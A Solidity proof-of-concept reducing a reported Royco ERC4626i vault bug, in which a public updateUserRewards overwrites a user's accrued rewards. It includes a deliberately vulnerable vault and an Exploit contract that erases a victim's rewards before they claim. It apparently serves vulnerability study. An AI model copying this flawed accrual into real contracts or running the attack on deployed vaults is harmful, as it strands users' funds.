// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Royco ERC4626i — User rewards can be permissionlessly erased
    (Cantina, Aug 2024; finding #46672)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: public updateUserRewards() OVERWRITES userData.accumulated with
      (balanceOf[user] * elapsed * rate) / WAD
    instead of accruing. Anyone may call it for any user. Two calls in the same
    block: first sets accumulated to earned rewards and lastUpdate=now; second
    has elapsed=0 so overwrites accumulated to 0. claim() also invokes
    updateUserRewards first, so a permissionless poke + claim wipes payout.
    Erased rewards leave incentive tokens permanently stuck in the vault.
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amt) external {
        totalSupply += amt;
        balanceOf[to] += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Reduced ERC4626i — share vault + reward campaigns with the blamed accrual.
contract ERC4626i {
    uint256 public constant WAD = 1e18;

    MockERC20 public immutable asset;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    struct CampaignData {
        address rewardToken;
        uint256 start;
        uint256 end;
        uint256 rate;
        uint256 incentiveAmount;
    }

    struct UserData {
        uint256 accumulated;
        uint256 lastUpdate;
        bool optedIn;
    }

    uint256 public nextCampaignId;
    mapping(uint256 => CampaignData) public campaigns;
    mapping(uint256 => mapping(address => UserData)) public userCampaign;

    constructor(MockERC20 asset_) {
        asset = asset_;
    }

    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        shares = assets;
        asset.transferFrom(msg.sender, address(this), assets);
        totalSupply += shares;
        balanceOf[receiver] += shares;
    }

    function createRewardsCampaign(
        address rewardToken,
        uint256 startTime,
        uint256 endTime,
        uint256 incentiveAmount
    ) external returns (uint256 campaignId) {
        require(endTime > startTime, "duration");
        MockERC20(rewardToken).transferFrom(msg.sender, address(this), incentiveAmount);
        campaignId = nextCampaignId++;
        uint256 duration = endTime - startTime;
        // rate so balance * duration * rate / WAD == incentive when balance is the only depositor
        // but accrual formula is balance * elapsed * rate / WAD — with large balance this overflows.
        // Finding uses: rate ~ 100/s with deposit 10e18. Cap elapsed to campaign duration.
        // Use rate = 100 (tokens per second per whole-share unit) matching the finding PoC shape:
        //   accumulated = (balanceOf[user] * elapsed * rate) / WAD
        // with rate chosen so a 10e18 deposit over DURATION accrues a positive amount.
        campaigns[campaignId] = CampaignData({
            rewardToken: rewardToken,
            start: startTime,
            end: endTime,
            rate: 100, // matching finding: incentiveAmount = 100 * duration
            incentiveAmount: incentiveAmount
        });
    }

    function optIntoCampaign(uint256 campaignId, address /* referral */) external {
        UserData storage u = userCampaign[campaignId][msg.sender];
        require(!u.optedIn, "already");
        u.optedIn = true;
        // lastUpdate = 0 → first update uses elapsed = block.timestamp (no vm.warp needed).
        u.lastUpdate = 0;
    }

    /// @notice PUBLIC — any account may call for any user. Overwrites accumulated.
    function updateUserRewards(uint256 campaignId, address user) public {
        UserData storage userData = userCampaign[campaignId][user];
        require(userData.optedIn, "not opted in");
        CampaignData storage _campaignData = campaigns[campaignId];

        uint256 elapsed = block.timestamp - userData.lastUpdate;
        uint256 maxElapsed = _campaignData.end - _campaignData.start;
        if (elapsed > maxElapsed) {
            elapsed = maxElapsed;
        }

        // FIX: accumulate (+=) with proper index math; restrict to self / hooks only.
        // Two same-block calls: first sets rewards; second has elapsed=0 → accumulated=0.
        userData.accumulated = (balanceOf[user] * elapsed * _campaignData.rate) / WAD; // @> VULN: overwrites (not +=); permissionless
        userData.lastUpdate = block.timestamp;
    }

    function claim(uint256 campaignId, address user) external returns (uint256 claimed) {
        updateUserRewards(campaignId, user);
        UserData storage userData = userCampaign[campaignId][user];
        claimed = userData.accumulated;
        userData.accumulated = 0;
        if (claimed > 0) {
            MockERC20(campaigns[campaignId].rewardToken).transfer(user, claimed);
        }
    }

    function accumulatedOf(uint256 campaignId, address user) external view returns (uint256) {
        return userCampaign[campaignId][user].accumulated;
    }
}

/// @dev User identity helper (opt-in / claim as the victim).
contract UserHelper {
    function optIn(ERC4626i vault, uint256 campaignId) external {
        vault.optIntoCampaign(campaignId, address(0));
    }

    function claim(ERC4626i vault, uint256 campaignId) external returns (uint256) {
        return vault.claim(campaignId, address(this));
    }
}

/// @dev Attacker permissionlessly pokes updateUserRewards; victim claim then pays 0.
contract Exploit {
    MockERC20 public asset;
    MockERC20 public rewardToken;
    ERC4626i public vault;
    UserHelper public user;
    uint256 public campaignId;
    uint256 public claimedByUser;
    uint256 public rewardsBeforeWipe;

    uint256 public constant DEPOSIT = 10e18;
    uint256 public constant DURATION = 14 days;
    uint256 public constant INCENTIVE = 100 * DURATION;

    constructor() {
        asset = new MockERC20("Mock", "MOCK");
        rewardToken = new MockERC20("Reward", "RWD");
        vault = new ERC4626i(asset);
        user = new UserHelper();

        rewardToken.mint(address(this), INCENTIVE);
        rewardToken.approve(address(vault), INCENTIVE);
        campaignId = vault.createRewardsCampaign(address(rewardToken), 0, DURATION, INCENTIVE);

        asset.mint(address(this), DEPOSIT);
        asset.approve(address(vault), DEPOSIT);
        vault.deposit(DEPOSIT, address(user));
        user.optIn(vault, campaignId);
    }

    function run() external {
        // Permissionless poke #1: accrues rewards (elapsed capped to campaign duration).
        vault.updateUserRewards(campaignId, address(user));
        rewardsBeforeWipe = vault.accumulatedOf(campaignId, address(user));
        require(rewardsBeforeWipe > 0, "should have accrued rewards");

        // claim() calls updateUserRewards again in the same block → elapsed=0 → wipe → pay 0.
        claimedByUser = user.claim(vault, campaignId);
        require(claimedByUser == 0, "claim should pay zero after wipe");
        require(vault.accumulatedOf(campaignId, address(user)) == 0, "accumulated wiped");

        // HARM: reward tokens stuck in vault; user received nothing; non-zero rewards erased.
        require(rewardToken.balanceOf(address(vault)) == INCENTIVE, "rewards stuck in vault");
        require(rewardToken.balanceOf(address(user)) == 0, "user received no rewards");
        require(rewardsBeforeWipe > 0, "erased non-zero rewards");
    }
}
